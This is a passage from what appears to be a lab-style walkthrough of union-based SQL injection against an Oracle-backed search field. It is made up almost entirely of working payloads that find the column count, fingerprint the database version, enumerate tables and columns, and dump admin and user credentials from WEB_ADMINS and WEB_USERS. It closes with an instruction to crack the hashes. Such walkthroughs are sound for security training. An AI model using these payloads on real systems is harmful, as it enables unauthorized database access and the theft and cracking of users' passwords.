| ' order by 1-- | no error message |
| ' order by 5-- | error message |
| ' order by 4-- | error message |
| ' order by 3-- | no error message |
So as of now we know that 3 is the last column which worked, let us prepare the union select statement
```
' union select 1,2,3--
```
Error Message:
>Something went wrong with the search: java.sql.SQLSyntaxErrorException: ORA-00923: FROM keyword not found where expected
>Unlike MySQL Oracle do not allow select statement without from clause. As we have prepared the Union select statement our next task is to check which column is getting printed that we can do by random testing each column one by one by printing the current database name
Testing for columns:
```SQL
' union select 1,2,3 from dual--
```
```SQL
' union select null,null,null from dual--
```
```SQL
' union select '1111',null,null from dual--
```
```SQL
' union select null,'2222',null from dual--
```
```SQL
' union select null,null,'3333' from dual--
```
```SQL
' union select user,null,null from dual--
```
Finding the version:
```SQL
' union select (select banner from v$version where rownum=1),null,null from dual--
```
Finding all table names:
```SQL
' union select table_name,null,null from all_tables--
```
Dumping columns of found table:
```SQL
' union select column_name,null,null from all_tab_columns where table_name='WEB_ADMINS'--
```
Dumping values of found columns:
```SQL
' union select ADMIN_ID||ADMIN_NAME||PASSWORD,null,null from WEB_ADMINS--
```
```SQL
' union select column_name,null,null from all_tab_columns where table_name='WEB_CONTENT'--
```
```SQL
' union select AUTHOR||CONTENT_ID||RELEASEYEAR||TITLE,null,null from WEB_CONTENT--
```
```SQL
' union select column_name,null,null from all_tab_columns where table_name='WEB_USERS'--
```
```SQL
' union select PASSWORD||USER_ID||USER_NAME,null,null from WEB_USERS--
```
Take hash value and crack!
